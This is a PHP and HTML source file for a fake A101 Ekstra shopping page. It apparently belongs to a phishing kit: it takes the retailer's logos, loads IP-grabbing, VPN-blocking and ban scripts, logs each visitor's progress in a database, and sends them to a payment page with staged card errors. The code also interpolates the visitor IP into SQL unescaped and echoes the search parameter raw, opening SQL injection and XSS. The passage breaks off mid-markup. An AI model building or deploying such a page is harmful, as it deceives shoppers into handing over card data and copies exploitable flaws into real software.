<?php 
   include_once("config.php");
   include_once("./monke/Data/Server/GrabIP.php");
   include_once("./monke/Data/Server/BlockVPN.php");
   include_once("./monke/Data/Server/BanControl.php");
   $pdo->query("UPDATE logs SET durum = 'Anasayfa' WHERE ip = '{$ip}'");
   $checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
   $stmt = $pdo->query("SELECT COUNT(*) AS urun_sayisi FROM urunler");
   $sonuc = $stmt->fetch(PDO::FETCH_ASSOC);
   $urun_sayisi = $sonuc['urun_sayisi'];

   if ($_GET['redirect'] == "error_limit") {
      header('Location: odeme?status=limit');
   } else if ($_GET['redirect'] == "error_internet") {
      header('Location: odeme?status=internet');
   }

   $sorgu_checkBasket = $pdo->prepare("SELECT * FROM sepet WHERE ip_adresi = ?");
   $sorgu_checkBasket->execute([$ip]);
   $checkBasket = $sorgu_checkBasket->fetch(PDO::FETCH_ASSOC);

   if ($checkBasket) {
      $urunlerArray = json_decode($checkBasket["urunler"], true);
      $sepetSayisi = is_array($urunlerArray) ? count($urunlerArray) : 0;

      if (!empty($urunlerArray)) {
         $sorgu_urunler = $pdo->prepare("SELECT id, urun_adi, urun_fiyati, urun_resmi FROM urunler WHERE id IN (" . implode(",", $urunlerArray) . ")");
         $sorgu_urunler->execute();
         $urunler = $sorgu_urunler->fetchAll(PDO::FETCH_ASSOC);
         foreach ($urunler as $urun) {
            $toplamFiyat2 += $urun['urun_fiyati'];
         }
         $toplamFiyat = number_format($toplamFiyat2, 2, ',', '.');
      }
   } else {
      $sepetSayisi = 0;
   }
?>
<!DOCTYPE html>
<html class="bg-zinc-900" lang="tr">

<head>
   <meta charSet="utf-8" />
   <meta name="viewport" content="width=device-width" />
   <title id="dynamic-title">A101 Ekstra - Harca Harca Bitmez</title>
   <meta name="description" content="A101 Ekstra - En uygun fiyatlarla online alışveriş yapın. Harca harca bitmez kampanyaları!" />
   <meta name="keywords" content="a101, ekstra, alışveriş, online, market, kampanya, indirim" />
   <meta name="robots" content="index, follow" />
   <meta name="next-head-count" content="11" />
   <link rel="preload" href="./assets/css/proxy.php?f=tailwind" as="style" />
   <link rel="stylesheet" href="./assets/css/proxy.php?f=tailwind" data-n-g="" />
   <link rel="preload" href="./assets/css/proxy.php?f=bootstrap" as="style" />
   <link rel="stylesheet" href="./assets/css/proxy.php?f=bootstrap" data-n-p="" />
   <noscript data-n-css=""></noscript>
   <script src="./js-proxy.php?lib=jquery"></script>
   <script src="./assets/js/dynamic-title.js"></script>
</head>

<body>
   <div id="__next" data-reactroot="">
      <div class="flex flex-col min-h-screen">
         <div class="sticky top-0 z-10 bg-white tablet:bg-brand-gray-background mobile:bg-brand-gray-background">
            <div class="bg-gradient-to-r from-[#71E6F5] to-brand-blue-primary pt-[10px] pb-[6px] overflow-x-scroll no-scrollbar overflow-y-hidden">
               <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
                  <div class="flex items-center">
                     <div>
                        <div class="flex items-center gap-x-[6px] mobile:pr-4">
                           <div class="z-20 relative">
                              <a class="cursor-pointer bg-brand-blue-secondary flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="javascript:void(0);">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Kurumsal" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/a101-logo-2_256x256.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a>
                           </div>
                           <div class="z-20 relative">
                              <a class="cursor-pointer bg-white flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="/">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Ekstra" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/extra-logo_512x512.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a>
                              <div class="absolute -left-4 tablet:-bottom-[7px] mobile:-bottom-[7px]">
                              </div>
                           </div>
                           <div class="z-20 relative"><a class="cursor-pointer bg-brand-blue-secondary flex justify-center items-center  rounded-md mobile:px-4 laptop:!px-8 tablet:!px-10 mobile:h-11 tablet:h-[52px] w-[125px] tablet:w-[160px]" href="javascript:void(0);">
                                 <div class="select-none relative w-full h-full">
                                    <div class="transition-opacity duration-300 opacity-100 aspect-[70/26] w-full h-full flex items-center justify-center"><img loading="lazy" draggable="false" alt="A101 Kapıda" src="https://api.a101prod.retter.io/dbmk89vnr/CALL/Image/get/kapida-logo_512x512.svg" class="scale-x-100" style="width: 100%;"></div>
                                 </div>
                              </a></div>
                        </div>
                     </div>
                     <div class="flex-1"></div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:hidden laptop:block"><a class="bg-brand-gray-background flex items-center rounded-full  cursor-pointer tablet:border tablet:border-white/50 tablet:h-12 tablet:w-12 tablet:justify-center laptop:w-auto laptop:px-4 desktop-px-6 p-2" title="Kampanyalar" href="javascript:void(0);">
                           <div><svg width="17" height="18" viewBox="0 0 17 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M0.249268 7.20081V15.3183C0.249268 16.5213 1.22809 17.5002 2.43086 17.5002H13.8853C15.0884 17.5002 16.0672 16.5213 16.0672 15.3183V7.20081C16.0672 5.99775 15.0884 5.01892 13.8853 5.01892L11.6758 5.01906C11.9356 4.86076 12.1473 4.69535 12.2778 4.52635C13.0521 3.52573 12.8689 2.08692 11.8683 1.31265C11.4511 0.989786 10.9574 0.833496 10.4678 0.833496C9.78305 0.833496 9.10601 1.13899 8.65444 1.72223C8.42397 2.02004 8.26651 2.55616 8.15805 3.16145C8.04972 2.55602 7.89213 2.01976 7.66166 1.72223C7.21038 1.139 6.53334 0.833496 5.84861 0.833496C5.35904 0.833496 4.86538 0.989804 4.44825 1.31294C3.44763 2.08721 3.26443 3.52602 4.0387 4.52664C4.16938 4.69548 4.38121 4.86075 4.64074 5.01935L2.43079 5.01921C1.22802 5.01907 0.249268 5.99778 0.249268 7.20081ZM1.34016 15.3183V9.92821H7.61275V16.4094H2.4309C1.82959 16.4094 1.34016 15.92 1.34016 15.3183ZM14.9765 15.3183C14.9765 15.9197 14.487 16.4092 13.8856 16.4092H8.70371V9.92836H14.9763L14.9765 15.3183ZM13.8857 6.11006C14.4872 6.11006 14.9766 6.5995 14.9766 7.20095V8.83732L8.70401 8.83718V6.11007L13.8857 6.11006ZM9.51727 2.38995C9.74618 2.09399 10.0928 1.92432 10.4679 1.92432C10.7351 1.92432 10.9884 2.01101 11.2006 2.17529C11.4542 2.37145 11.6159 2.65473 11.6566 2.97248C11.6972 3.29051 11.6115 3.6051 11.4153 3.85838C11.2036 4.12373 10.2149 4.56731 9.05346 4.94898C9.13161 3.72999 9.31326 2.662 9.51727 2.38995ZM4.66013 2.9726C4.7007 2.65458 4.86256 2.37158 5.1161 2.17541C5.32836 2.01113 5.58174 1.92444 5.84894 1.92444C6.2239 1.92444 6.57041 2.09427 6.79916 2.38981C7.00287 2.66129 7.18422 3.72983 7.26268 4.94965C6.10204 4.56842 5.11366 4.12469 4.90171 3.85876C4.70512 3.60523 4.61941 3.29061 4.66013 2.9726ZM7.61275 6.10999V8.8374L1.34016 8.83725V7.20074C1.34016 6.59928 1.82959 6.10985 2.43105 6.10985L7.61275 6.10999Z" fill="#00BAD3"></path>
                              </svg></div>
                           <div class="ml-2 font-medium text-brand-blue-primary text-sm hidden laptop:block">Kampanyalar</div>
                        </a></div>
                     <div class="mobile:w-6 tablet:w-2"></div>
                     <div class="mobile:hidden laptop:block">
                        <div>
                           <div class="bg-brand-gray-background flex items-center rounded-full  cursor-pointer  tablet:border tablet:border-white/50 tablet:h-12 tablet:w-12 tablet:justify-center laptop:w-auto mobile:p-2 laptop:px-4">
                              <div><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <circle cx="10.0001" cy="6.24984" r="3.90833" stroke="#00BAD3" stroke-width="1.35"></circle>
                                    <path d="M1.925 16.2779C1.925 14.1961 3.61264 12.5085 5.69445 12.5085H14.3056C16.3874 12.5085 18.075 14.1961 18.075 16.2779C18.075 17.1324 17.3823 17.8252 16.5278 17.8252H3.47222C2.61771 17.8252 1.925 17.1324 1.925 16.2779Z" stroke="#00BAD3" stroke-width="1.35"></path>
                                 </svg></div>
                              <div class="ml-2 text-brand-blue-primary text-sm hidden font-medium laptop:block">Giriş Yap</div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
               <div id="search-bar-section" class="hidden laptop:block">
                  <div class="flex items-center justify-between gap-2 w-full">
                     <div class="my-[10px] w-full">
                        <div class="relative flex-1">
                           <form><input name="search_text" value="<?php if ($_GET['search_text']) {
                                                                     echo $_GET['search_text'];
                                                                  } ?>" class="text-center outline-none caret-brand-blue-primary ring-0 pl-4 pr-10 focus:!ring-brand-gray-border focus:ring-0 focus:border-brand-gray-border w-full bg-white items-center h-10 tablet:h-12 rounded-full focus:placeholder:text-white cursor-pointer border border-brand-gray-border placeholder:text-brand-gray-secondary placeholder:text-base" placeholder="Aramak istediğin ürünü yaz..." autoComplete="off" /></form>
                           <div class="absolute mobile:left-3 laptop:left-4 top-1/2 -translate-y-1/2">
                              <div>
                                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M10.875 18.75C15.2242 18.75 18.75 15.2242 18.75 10.875C18.75 6.52576 15.2242 3 10.875 3C6.52576 3 3 6.52576 3 10.875C3 15.2242 6.52576 18.75 10.875 18.75Z" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M16.4434 16.4434L20.9997 20.9997" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                              </div>
                           </div>
                           <div class="absolute right-5 top-1/2 -translate-y-1/2"></div>
                        </div>
                     </div>
                     <?php if ($sepetSayisi > 0): ?>
                        <div class="w-full max-w-[160px]" onclick="window.location.href='sepet'">
                           <div>
                              <div>
                                 <div>
                                    <div class="w-full">
                                       <div class="w-full flex items-center rounded-3xl px-1 bg-brand-blue-primary h-12 cursor-pointer">
                                          <div class="p-2 bg-white rounded-full flex justify-center items-center h-10 w-10">
                                             <div class="relative"><svg width="22" height="20" viewBox="0 0 22 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                   <path d="M15.0292 15.3145C13.8912 15.3145 12.9685 16.2369 12.9685 17.3749C12.9685 18.5132 13.8909 19.4357 15.0289 19.4357C16.1672 19.4357 17.0896 18.5132 17.0896 17.3752C17.0886 16.2374 16.1667 15.3156 15.0292 15.3145ZM15.0292 18.5131C14.4005 18.5131 13.8912 18.0036 13.8912 17.3752C13.8912 16.7466 14.4005 16.2371 15.0289 16.2371C15.6576 16.2369 16.167 16.7466 16.167 17.3749C16.1662 18.0031 15.6573 18.512 15.0292 18.5131Z" fill="#333333"></path>
                                                   <path d="M20.5384 3.9065H4.16788L3.87995 2.73513C3.63127 1.71329 2.71392 0.99569 1.66249 1.00002H1.46127C1.20653 1.00002 1 1.20655 1 1.46144C1 1.71618 1.20653 1.92271 1.46127 1.92271H1.66249C2.28815 1.91766 2.8353 2.34371 2.98396 2.95162L5.22393 12.0993C5.47391 13.1191 6.39198 13.8335 7.44182 13.8254H17.0235C18.088 13.834 19.0145 13.0995 19.2491 12.0613L20.9883 4.45971C21.0198 4.32462 20.987 4.1826 20.8994 4.07478C20.8112 3.96639 20.6783 3.90433 20.5384 3.9065ZM18.3498 11.8585C18.2093 12.4758 17.6566 12.911 17.0235 12.9028H7.44182C6.81702 12.9095 6.26959 12.4854 6.12035 11.8786L4.39361 4.82919H19.9595L18.3498 11.8585Z" fill="#333333"></path>
                                                   <path d="M8.78862 15.3145C7.65059 15.3145 6.72791 16.2369 6.72791 17.3749C6.72791 18.5132 7.65045 19.4357 8.78848 19.4357C9.92665 19.4357 10.8492 18.5132 10.8492 17.3752C10.8482 16.2374 9.92622 15.3156 8.78862 15.3145ZM8.78862 18.5131C8.16007 18.5131 7.65059 18.0036 7.65059 17.3752C7.65059 16.7466 8.16007 16.2371 8.78848 16.2371C9.41703 16.2369 9.9265 16.7466 9.9265 17.3749C9.92578 18.0031 9.41674 18.512 8.78862 18.5131Z" fill="#333333"></path>
                                                   <path d="M15.0292 15.3145C13.8912 15.3145 12.9685 16.2369 12.9685 17.3749C12.9685 18.5132 13.8909 19.4357 15.0289 19.4357C16.1672 19.4357 17.0896 18.5132 17.0896 17.3752C17.0886 16.2374 16.1667 15.3156 15.0292 15.3145ZM15.0292 18.5131C14.4005 18.5131 13.8912 18.0036 13.8912 17.3752C13.8912 16.7466 14.4005 16.2371 15.0289 16.2371C15.6576 16.2369 16.167 16.7466 16.167 17.3749C16.1662 18.0031 15.6573 18.512 15.0292 18.5131Z" stroke="#333333" stroke-width="0.4"></path>
                                                   <path d="M20.5384 3.9065H4.16788L3.87995 2.73513C3.63127 1.71329 2.71392 0.99569 1.66249 1.00002H1.46127C1.20653 1.00002 1 1.20655 1 1.46144C1 1.71618 1.20653 1.92271 1.46127 1.92271H1.66249C2.28815 1.91766 2.8353 2.34371 2.98396 2.95162L5.22393 12.0993C5.47391 13.1191 6.39198 13.8335 7.44182 13.8254H17.0235C18.088 13.834 19.0145 13.0995 19.2491 12.0613L20.9883 4.45971C21.0198 4.32462 20.987 4.1826 20.8994 4.07478C20.8112 3.96639 20.6783 3.90433 20.5384 3.9065ZM18.3498 11.8585C18.2093 12.4758 17.6566 12.911 17.0235 12.9028H7.44182C6.81702 12.9095 6.26959 12.4854 6.12035 11.8786L4.39361 4.82919H19.9595L18.3498 11.8585Z" stroke="#333333" stroke-width="0.4"></path>
                                                   <path d="M8.78862 15.3145C7.65059 15.3145 6.72791 16.2369 6.72791 17.3749C6.72791 18.5132 7.65045 19.4357 8.78848 19.4357C9.92665 19.4357 10.8492 18.5132 10.8492 17.3752C10.8482 16.2374 9.92622 15.3156 8.78862 15.3145ZM8.78862 18.5131C8.16007 18.5131 7.65059 18.0036 7.65059 17.3752C7.65059 16.7466 8.16007 16.2371 8.78848 16.2371C9.41703 16.2369 9.9265 16.7466 9.9265 17.3749C9.92578 18.0031 9.41674 18.512 8.78862 18.5131Z" stroke="#333333" stroke-width="0.4"></path>
                                                </svg>
                                                <div class="absolute bg-brand-blue-primary text-white rounded-full p-1 w-auto h-[14px] text-[10px]  -top-1 -right-1 flex justify-center items-center"><?php echo $sepetSayisi; ?></div>
                                             </div>
                                          </div>
                                          <div class="flex w-full justify-center">
                                             <div class="text-white text-base font-medium">₺<?php echo $toplamFiyat; ?></div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     <?php endif; ?>
                  </div>
               </div>
            </div>
            <div class="mobile:block laptop:hidden ">
               <div class="w-full border-b">
                  <div class="my-[10px] w-full flex items-center">
                     <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
                        <div class="relative flex-1">
                           <form><input name="search_text" value="<?php if ($_GET['search_text']) {
                                                                     echo $_GET['search_text'];
                                                                  } ?>" class="text-center outline-none caret-brand-blue-primary ring-0 pl-4 pr-10 focus:!ring-brand-gray-border focus:ring-0 focus:border-brand-gray-border w-full bg-white items-center h-10 tablet:h-12 rounded-full focus:placeholder:text-white cursor-pointer border border-brand-gray-border placeholder:text-brand-gray-secondary placeholder:text-base !pr-1 mobile:placeholder:!text-[15px]" placeholder="Aramak istediğin ürünü yaz..." autoComplete="off" /></form>
                           <div class="absolute mobile:left-3 laptop:left-4 top-1/2 -translate-y-1/2">
                              <div>
                                 <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M10.875 18.75C15.2242 18.75 18.75 15.2242 18.75 10.875C18.75 6.52576 15.2242 3 10.875 3C6.52576 3 3 6.52576 3 10.875C3 15.2242 6.52576 18.75 10.875 18.75Z" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M16.4434 16.4434L20.9997 20.9997" stroke="#333333" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                              </div>
                           </div>
                           <div class="absolute right-5 top-1/2 -translate-y-1/2"></div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="mobile:hidden laptop:block border-y border-brand-grey-border"></div>
         </div>
         <div class="relative flex-1">
            <div class="bg-white">
               <div class="laptop:hidden mobile:block">
                  <div class="flex w-full py-2.5 border-b mb-4">
                     <div class="flex justify-center w-full border-r">
                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M11.0024 6.71838C10.7725 6.93277 10.4021 6.93277 10.1723 6.71838C9.94237 6.504 9.94237 6.15859 10.1723 5.9442L13.9181 2.38345C14.148 2.16906 14.5184 2.16906 14.7482 2.38345L18.4941 5.9442C18.724 6.15859 18.724 6.504 18.4941 6.71838C18.3791 6.82558 18.2259 6.87322 18.0854 6.87322C17.9449 6.87322 17.7917 6.82558 17.6767 6.71838L14.9143 4.08665V17.2303C14.9143 17.5281 14.6588 17.7782 14.3268 17.7782C13.9947 17.7782 13.7393 17.54 13.7393 17.2303V4.08665L11.0024 6.71838Z" fill="#333333"></path>
                           <path d="M1.49488 13.2863C1.72515 13.0718 2.09614 13.0718 2.32641 13.2863L5.07902 15.919V2.77088C5.07902 2.47293 5.33487 2.22266 5.66748 2.22266C6.0001 2.22266 6.25595 2.46101 6.25595 2.77088V15.919L8.99577 13.2863C9.22604 13.0718 9.59703 13.0718 9.8273 13.2863C10.0576 13.5008 10.0576 13.8464 9.8273 14.0609L6.07685 17.6233C5.96172 17.7305 5.8082 17.7782 5.66748 17.7782C5.52676 17.7782 5.37325 17.7305 5.25811 17.6233L1.50767 14.0609C1.2774 13.8464 1.2774 13.5008 1.49488 13.2863Z" fill="#333333"></path>
                        </svg>
                        <span class="ml-2">Sırala</span>
                     </div>
                     <div class="flex justify-center w-full">
                        <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M5.8895 1.99963C4.8625 1.99963 3.99895 2.70696 3.73947 3.65541H2.58134C2.50491 3.65511 2.42918 3.66995 2.35851 3.69905C2.28785 3.72816 2.22364 3.77097 2.1696 3.82501C2.11556 3.87906 2.07275 3.94326 2.04364 4.01392C2.01454 4.08459 1.9997 4.16032 2 4.23674C2.0003 4.31279 2.01557 4.38803 2.04495 4.45817C2.07432 4.52831 2.11722 4.59198 2.1712 4.64554C2.22519 4.6991 2.28919 4.74151 2.35956 4.77034C2.42993 4.79916 2.50529 4.81385 2.58134 4.81355H3.73721C3.99493 5.76461 4.86063 6.47498 5.8895 6.47498C6.90799 6.47498 7.76648 5.77837 8.03386 4.84182L17.6349 4.81355C17.7109 4.8134 17.7862 4.79828 17.8564 4.76904C17.9266 4.7398 17.9904 4.69702 18.044 4.64314C18.0977 4.58927 18.1402 4.52535 18.1692 4.45503C18.1981 4.38472 18.213 4.30939 18.2128 4.23335C18.2125 4.08016 18.1515 3.93334 18.0432 3.82502C17.9349 3.7167 17.7881 3.65571 17.6349 3.65541L8.0497 3.68369C7.80019 2.72067 6.9269 1.99963 5.8895 1.99963ZM5.8895 3.15777C6.49287 3.15777 6.9696 3.63338 6.9696 4.23674C6.9696 4.84011 6.49287 5.31684 5.8895 5.31684C5.28612 5.31684 4.81053 4.84011 4.81053 4.23674C4.81053 3.63338 5.28612 3.15777 5.8895 3.15777ZM12.076 7.5958C11.0321 7.5958 10.1535 8.31569 9.89435 9.28098H2.58134C2.5052 9.28068 2.42974 9.29541 2.3593 9.3243C2.28886 9.3532 2.2248 9.39571 2.17081 9.44939C2.11681 9.50307 2.07393 9.56687 2.04462 9.63715C2.01531 9.70742 2.00015 9.78278 2 9.85892C1.99985 9.93525 2.0148 10.0109 2.04397 10.0814C2.07315 10.1519 2.11598 10.216 2.17 10.2699C2.22403 10.3238 2.28818 10.3665 2.35878 10.3956C2.42937 10.4246 2.505 10.4394 2.58134 10.4391H9.89548C10.1554 11.4041 11.0329 12.1254 12.076 12.1254C13.1192 12.1254 13.9966 11.4041 14.2566 10.4391H17.6349C17.7109 10.439 17.7862 10.4238 17.8564 10.3946C17.9266 10.3654 17.9904 10.3226 18.044 10.2687C18.0977 10.2148 18.1402 10.1509 18.1692 10.0806C18.1981 10.0103 18.213 9.93496 18.2128 9.85892C18.2125 9.70573 18.1515 9.55891 18.0432 9.45059C17.9349 9.34227 17.7881 9.28128 17.6349 9.28098H14.2577C13.9986 8.31569 13.12 7.5958 12.076 7.5958ZM12.076 8.75394C12.6949 8.75394 13.1844 9.24003 13.1844 9.85892C13.1844 10.4778 12.6949 10.9673 12.076 10.9673C11.4571 10.9673 10.9677 10.4778 10.9677 9.85892C10.9677 9.24003 11.4571 8.75394 12.076 8.75394ZM7.57581 13.4996C6.53304 13.4996 5.65441 14.2202 5.39412 15.1848H2.58134C2.50491 15.1845 2.42918 15.1993 2.35851 15.2284C2.28785 15.2575 2.22364 15.3003 2.1696 15.3544C2.11556 15.4084 2.07275 15.4726 2.04364 15.5433C2.01454 15.614 1.9997 15.6897 2 15.7661C2.0003 15.8422 2.01557 15.9174 2.04495 15.9875C2.07432 16.0577 2.11722 16.1213 2.1712 16.1749C2.22519 16.2285 2.28919 16.2709 2.35956 16.2997C2.42993 16.3285 2.50529 16.3432 2.58134 16.3429H5.39299C5.65162 17.3099 6.5313 18.0326 7.57581 18.0326C8.62029 18.0326 9.49884 17.3098 9.7575 16.3429H17.6349C17.7879 16.3426 17.9345 16.2818 18.0428 16.1737C18.1511 16.0656 18.2122 15.9191 18.2128 15.7661C18.2131 15.69 18.1984 15.6145 18.1695 15.5441C18.1406 15.4736 18.0981 15.4096 18.0444 15.3556C17.9907 15.3016 17.9269 15.2587 17.8567 15.2294C17.7864 15.2001 17.711 15.1849 17.6349 15.1848H9.75637C9.49604 14.2203 8.61855 13.4996 7.57581 13.4996ZM7.57581 14.6577C8.19472 14.6577 8.68419 15.1472 8.68419 15.7661C8.68419 16.385 8.19472 16.8745 7.57581 16.8745C6.9569 16.8745 6.46744 16.385 6.46744 15.7661C6.46744 15.1472 6.9569 14.6577 7.57581 14.6577Z" fill="#333333"></path>
                        </svg>
                        <span class="ml-2">Filtrele</span>
                     </div>
                  </div>
               </div>
               <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
                  <div class="flex laptop:pt-6">
                     <div class="mobile:hidden laptop:block sticky h-full" style="top: 202px;">
                        <div class="relative overflow-hidden hover:custom-scrollbar w-[230px] pr-[7px]" style="height: calc(-202px + 100vh);">
                           <div class="w-[220px] pb-4">
                              <div class="mb-[18px] text-lg font-medium">Filtreler</div>
                              <div class="mb-[18px]">
                                 <div class="undefined ">
                                    <div class="relative flex items-center justify-between cursor-pointer">
                                       <div class="text-sm w-11/12 h-full flex items-center">
                                          <div class="font-sm font-medium">Kategoriler</div>
                                       </div>
                                       <span class="ml-auto -mr-1 h-5 w-5">
                                          <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 20px;">
                                             <path d="M7.20001 13.8L12 9.6L16.8 13.8" stroke="#333333" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"></path>
                                          </svg>
                                       </span>
                                    </div>
                                    <div class="text-sm font-normal mt-2 block">
                                       <div class="max-h-[252px] overflow-y-auto scrollbar">
                                          <div class="my-1" onclick="window.location.href='/?kategori=1'">
                                             <div class="flex flex-wrap">
                                                <label class="inline-flex items-start select-none">
                                                   <div class="w-5 h-5 border bg-white rounded-md border-brand-gray-border  flex items-center justify-center cursor-pointer">
                                                      <?php if ($_GET['kategori'] == "1"): ?>
                                                         <div class="opacity-100 text-brand-blue-primary"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php else: ?>
                                                         <div class="opacity-0"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php endif; ?>
                                                   </div>
                                                   <span class="flex self-center ml-2 cursor-pointer text-[13px]">Beyaz Eşya &amp; Ankastre</span>
                                                </label>
                                             </div>
                                          </div>
                                          <div class="my-1" onclick="window.location.href='/?kategori=2'">
                                             <div class="flex flex-wrap">
                                                <label class="inline-flex items-start select-none">
                                                   <div class="w-5 h-5 border bg-white rounded-md border-brand-gray-border  flex items-center justify-center cursor-pointer">
                                                      <?php if ($_GET['kategori'] == "2"): ?>
                                                         <div class="opacity-100 text-brand-blue-primary"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php else: ?>
                                                         <div class="opacity-0"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php endif; ?>
                                                   </div>
                                                   <span class="flex self-center ml-2 cursor-pointer text-[13px]">Telefon &amp; Aksesuar</span>
                                                </label>
                                             </div>
                                          </div>
                                          <div class="my-1" onclick="window.location.href='/?kategori=3'">
                                             <div class="flex flex-wrap">
                                                <label class="inline-flex items-start select-none">
                                                   <div class="w-5 h-5 border bg-white rounded-md border-brand-gray-border  flex items-center justify-center cursor-pointer">
                                                      <?php if ($_GET['kategori'] == "3"): ?>
                                                         <div class="opacity-100 text-brand-blue-primary"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
